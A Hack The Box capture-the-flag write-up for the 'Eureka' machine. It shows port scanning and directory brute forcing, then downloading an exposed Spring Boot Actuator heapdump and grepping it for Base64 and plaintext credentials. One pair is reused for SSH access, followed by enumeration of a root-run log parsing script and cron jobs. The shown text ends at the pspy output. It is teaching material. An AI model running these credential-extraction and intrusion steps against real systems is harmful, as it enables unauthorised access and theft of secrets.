---
Category: HTB/Machines/Linux
tags:
  - HTB
  - Machine
  - Linux
  - Hard
  - SpringFramework
  - SpringBootEureka
  - SpringBoot
  - Actuator
  - MicroService
  - Misconfiguration
  - LogfilePoisoning
  - CommandInjection
---

![](images/Eureka.png)

## Table of Contents

- [Summary](#Summary)
- [Reconnaissance](#Reconnaissance)
    - [Port Scanning](#Port-Scanning)
    - [Enumeration of Port 80/TCP](#Enumeration-of-Port-80TCP)
    - [Directory Brute Forcing](#Directory-Brute-Forcing)
- [Foothold](#Foothold)
    - [Spring Framework](#Spring-Framework)
        - [Spring Boot Actuator](#Spring-Boot-Actuator)
- [Enumeration (oscar190)](#Enumeration-oscar190)
- [Enumeration of Port 8761/TCP](#Enumeration-of-Port-8761TCP)
- [Attacking Spring Boot Eureka](#Attacking-Spring-Boot-Eureka)
    - [Micro-Service Mapping Abuse](#Micro-Service-Mapping-Abuse)
- [Privilege Escalation to miranda-wise](#Privilege-Escalation-to-miranda-wise)
- [user.txt](#usertxt)
- [Enumeration (miranda-wise)](#Enumeration-miranda-wise)
- [Privilege Escalation to root](#Privilege-Escalation-to-root)
- [root.txt](#roottxt)

## Summary

The `foothold` of the box is all around the `Spring Framework` and `Spring Boot Actuator` in particular. Therefore it starts with `directory brute forcing` on port `80/TCP` in order to reveal the `/actuator` endpoint which enables to `dump` the `heapdump` file which contains `two sets of credentials`. The first `credentials` grants access to the `application dashboard` running  on port `8167/TCP` and the second `credentials` are valid for the user `oscar190` which is necessary to get access via `SSH` and to `enumerate` more information on how the box works. With the session of `oscar190` a second user called `miranda-wise` can be found which is the target for the first `privilege escalation` and holds the `user.txt`. In order to achieve that a `script` within `/opt` which is used for `parsing logfiles` gives an indicator for the `root part` and running `PSPY` on the box reveals two `cronjobs`. One is simulating a `login` using `curl` and `plaintext credentials` on one of the `internal ports` of the `application` and the second job is using the script in order to parse `logfiles` from a directory within `/var/www/web/` which comes into play later. To `escalate privileges` to `miranda-wise` now it is necessary to `abuse` the `mapping` of `Micro-Services` in `Sping Eureka` to point the `login page` to the `local machine` and catch the `credentials` with a local listener. For `root` a flaw in the script needs to be abused since it uses the `username variable` and prints it `unescaped` and `unsanitized` to the `terminal`. The user `miranda-wise` is a `member` of the `developers group`, therefore she can `overwrite` and `poison` the files getting parsed by the `cronjob` running as `root` and use `command injection` in order to get `command execution` as `root`.

## Reconnaissance

### Port Scanning

The box started with the interesting port `8761/TCP` revealed by our initial `port scan` using `Nmap`.

```shell
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV 10.129.140.42
[sudo] password for kali:
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-26 21:03 CEST
Nmap scan report for furni.htb (10.129.140.42)
Host is up (0.21s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d6:b2:10:42:32:35:4d:c9:ae:bd:3f:1f:58:65:ce:49 (RSA)
|   256 90:11:9d:67:b6:f6:64:d4:df:7f:ed:4a:90:2e:6d:7b (ECDSA)
|_  256 94:37:d3:42:95:5d:ad:f7:79:73:a6:37:94:45:ad:47 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Furni | Home
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.57 seconds
```

```shell
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -p- 10.129.140.42
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-26 21:04 CEST
Nmap scan report for furni.htb (10.129.140.42)
Host is up (0.23s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d6:b2:10:42:32:35:4d:c9:ae:bd:3f:1f:58:65:ce:49 (RSA)
|   256 90:11:9d:67:b6:f6:64:d4:df:7f:ed:4a:90:2e:6d:7b (ECDSA)
|_  256 94:37:d3:42:95:5d:ad:f7:79:73:a6:37:94:45:ad:47 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Furni | Home
8761/tcp open  http    Apache Tomcat (language: en)
| http-auth: 
| HTTP/1.1 401 \x0D
|_  Basic realm=Realm
|_http-title: Site doesn't have a title.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 916.23 seconds
```

Since we spotted the `redirect` to `furni.htb`, we added it directly to our `/etc/hosts` file.

```shell
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.140.42   furni.htb
```

### Enumeration of Port 80/TCP

To be sure we are not overlooking some crucial information like `usernames` or potential `attack vectors` on the `web application` we quickly checked port `80/TCP` but didn't find anything of value.

- [http://furni.htb/](http://furni.htb/)

```shell
┌──(kali㉿kali)-[~]
└─$ whatweb http://furni.htb/    
http://furni.htb/ [200 OK] Bootstrap, Content-Language[en-US], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.140.42], Meta-Author[Untree.co], Script, Title[Furni | Home], UncommonHeaders[x-content-type-options], X-Frame-Options[DENY], X-XSS-Protection[0], nginx[1.18.0]
```

![](images/2025-04-26_21-06_80_website.png)

![](images/2025-04-26_21-09_80_register.png)

![](images/2025-04-26_21-09_80_login.png)

### Directory Brute Forcing

However as to complete our `reconnaissance` we started `directory brute forcing` and found the `/actuator` endpoint which indicated the presence of the `Spring Framework`.

```shell
┌──(kali㉿kali)-[~]
└─$ dirsearch -u http://furni.htb/

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/reports/http_furni.htb/__25-04-26_21-11-55.txt

Target: http://furni.htb/

[21:11:55] Starting: 
[21:12:19] 400 -   97B  - /;/json                                           
[21:12:19] 400 -   98B  - /;/admin
[21:12:19] 400 -   98B  - /;login/                                          
[21:12:19] 400 -   98B  - /;/login                                          
[21:12:19] 400 -  435B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           
[21:12:19] 400 -   98B  - /;admin/                                          
[21:12:19] 400 -   97B  - /;json/                                           
[21:12:22] 400 -  435B  - /a%5c.aspx                                        
[21:12:22] 200 -   14KB - /about                                            
[21:12:25] 400 -  110B  - /actuator/;/auditLog                              
[21:12:25] 400 -  107B  - /actuator/;/beans
[21:12:25] 400 -  113B  - /actuator/;/auditevents
[21:12:25] 400 -  106B  - /actuator/;/info                                  
[21:12:25] 400 -  106B  - /actuator/;/dump                                  
[21:12:25] 400 -  112B  - /actuator/;/conditions
[21:12:25] 400 -  108B  - /actuator/;/flyway
[21:12:25] 400 -  126B  - /actuator/;/exportRegisteredServices
[21:12:25] 400 -  113B  - /actuator/;/configprops
[21:12:25] 400 -  111B  - /actuator/;/liquibase
[21:12:25] 400 -  108B  - /actuator/;/events
[21:12:25] 400 -  110B  - /actuator/;/features
[21:12:25] 400 -  109B  - /actuator/;/logfile
[21:12:25] 400 -  110B  - /actuator/;/heapdump
[21:12:25] 400 -  118B  - /actuator/;/integrationgraph
[21:12:25] 400 -  123B  - /actuator/;/configurationMetadata
[21:12:25] 400 -  108B  - /actuator/;/health
[21:12:25] 400 -  109B  - /actuator/;/jolokia
[21:12:25] 400 -  108B  - /actuator/;/caches
[21:12:25] 400 -  105B  - /actuator/;/env
[21:12:25] 400 -  113B  - /actuator/;/healthcheck
[21:12:25] 200 -    2KB - /actuator
[21:12:25] 400 -  110B  - /actuator/;/mappings
[21:12:25] 400 -  115B  - /actuator/;/loggingConfig
[21:12:25] 400 -  111B  - /actuator/;/httptrace
[21:12:25] 400 -  109B  - /actuator/;/loggers
[21:12:25] 400 -  109B  - /actuator/;/metrics
[21:12:25] 400 -  112B  - /actuator/;/prometheus
[21:12:25] 400 -  109B  - /actuator/;/refresh
[21:12:25] 400 -  120B  - /actuator/;/registeredServices
[21:12:25] 400 -  119B  - /actuator/;/releaseAttributes
[21:12:25] 400 -  119B  - /actuator/;/resolveAttributes
[21:12:25] 400 -  115B  - /actuator/;/springWebflow
[21:12:25] 400 -  116B  - /actuator/;/scheduledtasks
[21:12:25] 400 -  105B  - /actuator/;/sso
[21:12:25] 400 -  108B  - /actuator/;/status
[21:12:25] 400 -  113B  - /actuator/;/ssoSessions
[21:12:25] 400 -  107B  - /actuator/;/trace                                 
[21:12:25] 400 -  110B  - /actuator/;/sessions
[21:12:25] 400 -  110B  - /actuator/;/shutdown
[21:12:25] 400 -  112B  - /actuator/;/statistics
[21:12:25] 400 -  112B  - /actuator/;/threaddump
[21:12:25] 200 -    2B  - /actuator/info                                    
[21:12:25] 200 -  467B  - /actuator/features
[21:12:26] 200 -   20B  - /actuator/caches                                  
[21:12:26] 405 -  114B  - /actuator/refresh                                 
[21:12:26] 200 -    6KB - /actuator/env                                     
[21:12:26] 200 -   15B  - /actuator/health                                  
[21:12:27] 200 -   76MB - /actuator/heapdump                                
[21:12:27] 200 -    3KB - /actuator/metrics                                 
[21:12:27] 400 -  108B  - /actuator/sessions
[21:12:27] 200 -   54B  - /actuator/scheduledtasks                          
[21:12:27] 200 -  198KB - /actuator/beans
[21:12:28] 200 -   35KB - /actuator/mappings                                
[21:12:28] 200 -  180KB - /actuator/conditions                              
[21:12:28] 200 -   98KB - /actuator/loggers
[21:12:28] 200 -  433KB - /actuator/threaddump                              
[21:12:29] 200 -   36KB - /actuator/configprops                             
[21:12:31] 400 -  106B  - /admin/%3bindex/                                  
[21:12:35] 400 -   98B  - /Admin;/                                          
[21:12:35] 400 -   98B  - /admin;/                                          
[21:13:01] 400 -  105B  - /blog/fckeditor                                   
[21:13:01] 400 -  105B  - /blog/error_log
[21:13:01] 400 -  104B  - /blog/wp-login
[21:13:01] 400 -  108B  - /blog/wp-login.php                                
[21:13:01] 200 -   13KB - /blog                                             
[21:13:03] 302 -    0B  - /cart  ->  http://furni.htb/login                 
[21:13:08] 302 -    0B  - /checkout  ->  http://furni.htb/login             
[21:13:11] 302 -    0B  - /comment  ->  http://furni.htb/login              
[21:13:15] 200 -   10KB - /contact                                          
[21:13:29] 500 -   73B  - /error                                            
[21:13:31] 400 -  139B  - /examples/jsp/%252e%252e/%252e%252e/manager/html/ 
[21:13:51] 400 -  100B  - /jkstatus;                                        
[21:13:57] 200 -    2KB - /login                                            
[21:13:58] 400 -  103B  - /login.wdm%2e                                     
[21:13:59] 200 -    1KB - /logout                                           
[21:14:31] 200 -    9KB - /register                                         
[21:14:40] 200 -   14KB - /services                                         
[21:14:41] 200 -   12KB - /shop                                             
                                                                             
Task Completed
```

## Foothold

### Spring Framework

#### Spring Boot Actuator

A typical attack on the `Spring Framework` is to check if it is possible to `dump` the `heapdump` file.

- [https://www.wiz.io/blog/spring-boot-actuator-misconfigurations](https://www.wiz.io/blog/spring-boot-actuator-misconfigurations)

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Eureka/files]
└─$ curl 'http://furni.htb/actuator/heapdump' -O 
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 76.4M  100 76.4M    0     0  4402k      0  0:00:17  0:00:17 --:--:-- 6161k
```

We got lucky and started searching through the file using `strings` and `grep` as described in the `article` by `Wiz`.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Eureka/files]
└─$ strings heapdump | grep -E "^Host:\s+\S+$" -C 10
Keep-Alive: timeout=60
Connection: keep-alive
VJ,(
V*K-*
SRsJ
Utlm-
GET /eureka/apps/delta HTTP/1.1
Accept: application/json, application/*+json
Authorization: Basic RXVyZWthU3J2cjowc2NhclBXRGlzVGhlQjNzdA==
Accept-Encoding: gzip, x-gzip, deflate
Host: localhost:8761
Connection: keep-alive
User-Agent: Apache-HttpClient/5.3.1 (Java/17.0.11)
;cH!
http-outgoing-2!
Accept-Encoding!
;(p!
;A`!
;'x!
Apache-HttpClient/5.3.1 (Java/17.0.11)!
;Vp!
--
X-Frame-Options: DENY
Content-Length: 0
Date: Thu, 01 Aug 2024 18:29:30 GMT
Keep-Alive: timeout=60
Connection: keep-alive
PUT /eureka/apps/FURNI/eureka:Furni:8082?status=UP&lastDirtyTimestamp=1722535252684 HTTP/1.1
Accept: application/json, application/*+json
Authorization: Basic RXVyZWthU3J2cjowc2NhclBXRGlzVGhlQjNzdA==
Accept-Encoding: gzip, x-gzip, deflate
Content-Length: 0
Host: localhost:8761
Connection: keep-alive
User-Agent: Apache-HttpClient/5.3.1 (Java/17.0.11)
;cH!
2>s(!
httponly!
UP_3_!
multiple '%s' headers found!
Attempted read on closed stream.!
No more header elements available!
PacketReader.10!
```

First we found a `password` for the user `EurekaSrvr` in `Base64` format.

```shell
┌──(kali㉿kali)-[~]
└─$ echo 'RXVyZWthU3J2cjowc2NhclBXRGlzVGhlQjNzdA==' | base64 -d
EurekaSrvr:0scarPWDisTheB3st
```

| Username   | Password          |
| ---------- | ----------------- |
| EurekaSrvr | 0scarPWDisTheB3st |

Since the `password` contained the name `0scar` in `leet speak`, we decided to search for the `password` but with `10 lines` above and below and found another `username` and `password`.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Eureka/files]
└─$ strings heapdump | grep '0scarPWDisTheB3st' -A 10 -B 10
management.endpoints.web.exposure.include!
spring.datasource.password!
0sc@r190_S0l!dP@sswd!
spring.datasource.username!
oscar190!
spring.datasource.url!
jdbc:mysql://localhost:3306/Furni_WebApp_DB!
spring.jpa.hibernate.ddl-auto!
none!
eureka.client.service-url.defaultZone!
http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/!
spring.cloud.inetutils.ignoredInterfaces!
enp0s.*!
spring.session.store-type!
jdbc!
spring.application.name!
org.springframework.http!
org.springframework.http.converter!
org.springframework.http.converter.json!
org.springframework.http.converter.xml!
org.hibernate!
```

| Username | Password             |
| -------- | -------------------- |
| oscar190 | 0sc@r190_S0l!dP@sswd |

The second `credentials` enabled us to get `foothold` as `oscar190` on the box.

```shell
┌──(kali㉿kali)-[~]
└─$ ssh oscar190@10.129.140.42
The authenticity of host '10.129.140.42 (10.129.140.42)' can't be established.
ED25519 key fingerprint is SHA256:5/rCExVFUnFdG5UFLnW7ExQuyelBwtSqwHzBiWKqza0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.140.42' (ED25519) to the list of known hosts.
oscar190@10.129.140.42's password:
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-214-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat 26 Apr 2025 09:25:05 PM UTC

  System load:           0.02
  Usage of /:            61.8% of 6.79GB
  Memory usage:          45%
  Swap usage:            0%
  Processes:             241
  Users logged in:       0
  IPv4 address for eth0: 10.129.140.42
  IPv6 address for eth0: dead:beef::250:56ff:feb0:a7a9


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

2 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


Last login: Sat Apr 26 21:25:07 2025 from 10.10.16.39
oscar190@eureka:~$
```

## Enumeration (oscar190)

As `oscar190` we started our `enumeration` of the box and found another user called `miranda-wise` which was our potential vector for `privilege escalation`.

```shell
oscar190@eureka:~$ id
uid=1000(oscar190) gid=1001(oscar190) groups=1001(oscar190)
```

```shell
oscar190@eureka:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:115:119:MySQL Server,,,:/nonexistent:/bin/false
oscar190:x:1000:1001:,,,:/home/oscar190:/bin/bash
miranda-wise:x:1001:1002:,,,:/home/miranda-wise:/bin/bash
_laurel:x:997:997::/var/log/laurel:/bin/false
```

| Username     |
| ------------ |
| miranda-wise |

```shell
oscar190@eureka:~$ sudo -l
[sudo] password for oscar190: 
Sorry, user oscar190 may not run sudo on localhost.
```

```shell
oscar190@eureka:~$ ss -tulpn
Netid                  State                   Recv-Q                   Send-Q                                          Local Address:Port                                      Peer Address:Port                  Process                  
udp                    UNCONN                  0                        0                                               127.0.0.53%lo:53                                             0.0.0.0:*                                              
udp                    UNCONN                  0                        0                                                     0.0.0.0:68                                             0.0.0.0:*                                              
udp                    UNCONN                  0                        0                                                           *:44497                                                *:*                                              
udp                    UNCONN                  0                        0                                                           *:34594                                                *:*                                              
udp                    UNCONN                  0                        0                                                           *:57380                                                *:*                                              
udp                    UNCONN                  0                        0                                                           *:37219                                                *:*                                              
tcp                    LISTEN                  0                        80                                                  127.0.0.1:3306                                           0.0.0.0:*                                              
tcp                    LISTEN                  0                        511                                                   0.0.0.0:80                                             0.0.0.0:*                                              
tcp                    LISTEN                  0                        4096                                            127.0.0.53%lo:53                                             0.0.0.0:*                                              
tcp                    LISTEN                  0                        128                                                   0.0.0.0:22                                             0.0.0.0:*                                              
tcp                    LISTEN                  0                        4096                                       [::ffff:127.0.0.1]:8080                                                 *:*                                              
tcp                    LISTEN                  0                        511                                                      [::]:80                                                [::]:*                                              
tcp                    LISTEN                  0                        100                                        [::ffff:127.0.0.1]:8081                                                 *:*                                              
tcp                    LISTEN                  0                        100                                        [::ffff:127.0.0.1]:8082                                                 *:*                                              
tcp                    LISTEN                  0                        128                                                      [::]:22                                                [::]:*                                              
tcp                    LISTEN                  0                        100                                                         *:8761                                                 *:*
```

Besides the usual checks for `sudo permissions` and `locally available ports` we checked `/opt` and found a script called `log_analyse.sh` which seemed to parse any given `logfile` for various information.

```shell
oscar190@eureka:/opt$ ls -la
total 24
drwxr-xr-x  4 root root     4096 Mar 20 14:17 .
drwxr-xr-x 19 root root     4096 Apr 22 12:47 ..
drwxrwx---  2 root www-data 4096 Aug  7  2024 heapdump
-rwxrwxr-x  1 root root     4980 Mar 20 14:17 log_analyse.sh
drwxr-x---  2 root root     4096 Apr  9 18:34 scripts
```

```shell
oscar190@eureka:/opt$ cat log_analyse.sh 
#!/bin/bash

# Colors
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
RESET='\033[0m'

LOG_FILE="$1"
OUTPUT_FILE="log_analysis.txt"

declare -A successful_users  # Associative array: username -> count
declare -A failed_users      # Associative array: username -> count
STATUS_CODES=("200:0" "201:0" "302:0" "400:0" "401:0" "403:0" "404:0" "500:0") # Indexed array: "code:count" pairs

if [ ! -f "$LOG_FILE" ]; then
    echo -e "${RED}Error: Log file $LOG_FILE not found.${RESET}"
    exit 1
fi


analyze_logins() {
    # Process successful logins
    while IFS= read -r line; do
        username=$(echo "$line" | awk -F"'" '{print $2}')
        if [ -n "${successful_users[$username]+_}" ]; then
            successful_users[$username]=$((successful_users[$username] + 1))
        else
            successful_users[$username]=1
        fi
    done < <(grep "LoginSuccessLogger" "$LOG_FILE")

    # Process failed logins
    while IFS= read -r line; do
        username=$(echo "$line" | awk -F"'" '{print $2}')
        if [ -n "${failed_users[$username]+_}" ]; then
            failed_users[$username]=$((failed_users[$username] + 1))
        else
            failed_users[$username]=1
        fi
    done < <(grep "LoginFailureLogger" "$LOG_FILE")
}


analyze_http_statuses() {
    # Process HTTP status codes
    while IFS= read -r line; do
        code=$(echo "$line" | grep -oP 'Status: \K.*')
        found=0
        # Check if code exists in STATUS_CODES array
        for i in "${!STATUS_CODES[@]}"; do
            existing_entry="${STATUS_CODES[$i]}"
            existing_code=$(echo "$existing_entry" | cut -d':' -f1)
            existing_count=$(echo "$existing_entry" | cut -d':' -f2)
            if [[ "$existing_code" -eq "$code" ]]; then
                new_count=$((existing_count + 1))
                STATUS_CODES[$i]="${existing_code}:${new_count}"
                break
            fi
        done
    done < <(grep "HTTP.*Status: " "$LOG_FILE")
}


analyze_log_errors(){
     # Log Level Counts (colored)
    echo -e "\n${YELLOW}[+] Log Level Counts:${RESET}"
    log_levels=$(grep -oP '(?<=Z  )\w+' "$LOG_FILE" | sort | uniq -c)
    echo "$log_levels" | awk -v blue="$BLUE" -v yellow="$YELLOW" -v red="$RED" -v reset="$RESET" '{
        if ($2 == "INFO") color=blue;
        else if ($2 == "WARN") color=yellow;
        else if ($2 == "ERROR") color=red;
        else color=reset;
        printf "%s%6s %s%s\n", color, $1, $2, reset
    }'

    # ERROR Messages
    error_messages=$(grep ' ERROR ' "$LOG_FILE" | awk -F' ERROR ' '{print $2}')
    echo -e "\n${RED}[+] ERROR Messages:${RESET}"
    echo "$error_messages" | awk -v red="$RED" -v reset="$RESET" '{print red $0 reset}'

    # Eureka Errors
    eureka_errors=$(grep 'Connect to http://localhost:8761.*failed: Connection refused' "$LOG_FILE")
    eureka_count=$(echo "$eureka_errors" | wc -l)
    echo -e "\n${YELLOW}[+] Eureka Connection Failures:${RESET}"
    echo -e "${YELLOW}Count: $eureka_count${RESET}"
    echo "$eureka_errors" | tail -n 2 | awk -v yellow="$YELLOW" -v reset="$RESET" '{print yellow $0 reset}'
}


display_results() {
    echo -e "${BLUE}----- Log Analysis Report -----${RESET}"

    # Successful logins
    echo -e "\n${GREEN}[+] Successful Login Counts:${RESET}"
    total_success=0
    for user in "${!successful_users[@]}"; do
        count=${successful_users[$user]}
        printf "${GREEN}%6s %s${RESET}\n" "$count" "$user"
        total_success=$((total_success + count))
    done
    echo -e "${GREEN}\nTotal Successful Logins: $total_success${RESET}"

    # Failed logins
    echo -e "\n${RED}[+] Failed Login Attempts:${RESET}"
    total_failed=0
    for user in "${!failed_users[@]}"; do
        count=${failed_users[$user]}
        printf "${RED}%6s %s${RESET}\n" "$count" "$user"
        total_failed=$((total_failed + count))
    done
    echo -e "${RED}\nTotal Failed Login Attempts: $total_failed${RESET}"

    # HTTP status codes
    echo -e "\n${CYAN}[+] HTTP Status Code Distribution:${RESET}"
    total_requests=0
    # Sort codes numerically
    IFS=$'\n' sorted=($(sort -n -t':' -k1 <<<"${STATUS_CODES[*]}"))
    unset IFS
    for entry in "${sorted[@]}"; do
        code=$(echo "$entry" | cut -d':' -f1)
        count=$(echo "$entry" | cut -d':' -f2)
        total_requests=$((total_requests + count))
        
        # Color coding
        if [[ $code =~ ^2 ]]; then color="$GREEN"
        elif [[ $code =~ ^3 ]]; then color="$YELLOW"
        elif [[ $code =~ ^4 || $code =~ ^5 ]]; then color="$RED"
        else color="$CYAN"
        fi
        
        printf "${color}%6s %s${RESET}\n" "$count" "$code"
    done
    echo -e "${CYAN}\nTotal HTTP Requests Tracked: $total_requests${RESET}"
}


# Main execution
analyze_logins
analyze_http_statuses
display_results | tee "$OUTPUT_FILE"
analyze_log_errors | tee -a "$OUTPUT_FILE"
echo -e "\n${GREEN}Analysis completed. Results saved to $OUTPUT_FILE${RESET}"
```

```shell
oscar190@eureka:/opt$ ./log_analyse.sh 
Error: Log file  not found.
```

A quick shot with `PSPY` revealed that the script got executed by `UID=0` which is `root` in order to parse the `application.log` in `var/www/web/user-management-service/log/`.

```shell
oscar190@eureka:/dev/shm$ ./pspy64 
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
<--- CUT FOR BREVITY --->
2025/04/26 22:00:07 CMD: UID=0     PID=1      | /sbin/init maybe-ubiquity 
2025/04/26 22:00:11 CMD: UID=0     PID=474435 | /usr/bin/find /var/www/web/user-management-service/log/ -type f -mmin +10 ! -name *.gz -delete 
2025/04/26 22:00:11 CMD: UID=0     PID=474436 | cp /opt/scripts/application_cloud.log /var/www/web/cloud-gateway/log/application.log 
2025/04/26 22:00:11 CMD: UID=0     PID=474437 | cp /opt/scripts/application_user.log /var/www/web/user-management-service/log/application.log 
2025/04/26 22:00:11 CMD: UID=0     PID=474438 | /usr/bin/chown www-data:www-data /var/www/web/user-management-service/log/application.log /var/www/web/user-management-service/log/application.log.2025-04-22.0.gz /var/www/web/user-management-service/log/application.log.2025-04-23.0.gz /var/www/web/user-management-service/log/archive /var/www/web/cloud-gateway/log/application.log /var/www/web/cloud-gateway/log/application.log.2025-04-22.0.gz /var/www/web/cloud-gateway/log/application.log.2025-04-23.0.gz                                                                                                                                                                                                           
2025/04/26 22:01:01 CMD: UID=0     PID=474448 | /usr/sbin/CRON -f 
2025/04/26 22:01:01 CMD: UID=0     PID=474449 | 
2025/04/26 22:01:01 CMD: UID=0     PID=474450 | /bin/bash /opt/scripts/miranda-Login-Simulator.sh 
2025/04/26 22:01:01 CMD: UID=0     PID=474451 | /bin/bash /opt/scripts/miranda-Login-Simulator.sh 
2025/04/26 22:01:01 CMD: UID=0     PID=474453 | /bin/bash /opt/scripts/miranda-Login-Simulator.sh 
2025/04/26 22:01:01 CMD: UID=0     PID=474454 | /bin/bash /opt/scripts/miranda-Login-Simulator.sh 
2025/04/26 22:01:01 CMD: UID=0     PID=474455 | /bin/bash /opt/scripts/miranda-Login-Simulator.sh 
2025/04/26 22:01:01 CMD: UID=0     PID=474458 | /bin/bash /opt/scripts/miranda-Login-Simulator.sh 
2025/04/26 22:01:01 CMD: UID=0     PID=474457 | 
2025/04/26 22:01:01 CMD: UID=0     PID=474456 | /bin/bash /opt/scripts/miranda-Login-Simulator.sh 
2025/04/26 22:01:01 CMD: UID=0     PID=474459 | 
2025/04/26 22:01:01 CMD: UID=0     PID=474460 | cat 
2025/04/26 22:01:01 CMD: UID=0     PID=474461 | curl http://furni.htb/login   -H Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8 -H Accept-Language: en-US,en;q=0.8 -H Cache-Control: max-age=0 -H Connection: keep-alive -H Content-Type: application/x-www-form-urlencoded -H Cookie: SESSION=OWUwNTdkMzItZWY0ZC00NjQwLWFmNzAtOTdmZWExZTZkYzlk -H User-Agent: Mozilla/5.0 (X11; Linux x86_64) --data @/tmp/tmp.Z2v9OfYe4E --insecure -i                                                                                                                                                                                                                                  
2025/04/26 22:01:01 CMD: UID=0     PID=474464 | 
